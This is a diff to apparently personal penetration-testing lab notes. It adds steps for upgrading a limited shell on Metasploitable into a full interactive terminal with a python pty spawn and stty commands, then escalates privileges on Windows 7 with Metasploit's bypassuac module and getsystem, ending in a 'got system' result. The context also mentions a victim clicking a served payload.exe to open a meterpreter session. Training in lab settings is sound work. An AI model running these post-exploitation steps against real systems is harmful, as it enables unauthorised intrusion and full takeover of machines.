@@ -61,3 +61,29 @@ listens
 
 target clicks on http://192.168.0.27/payload.exe > meterpreter
 
+UPGRADE TERMINAL
+
+*Metasploibale: get limited shell then:
+python -c 'import pty;pty.spawn("/bin/bash")'
+CRTL+Z (background)
+
+echo $TERM
+stty -a (rows and columns)
+stty raw -echo
+reset
+xterm (back)
+clear TERM environment variable not set
+export TERM=xterm
+export SHELL=bash
+stty rows 35 columns 166 (above data)
+**facilita privilege escalation
+
+PRIVILEGE ESCALATION (Session shows up in msf)
+Win 7
+meterpreter
+meterpreter > background
+use exploit/windows/local/bypassuac ()
+meterpreter > getsystem
+
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+
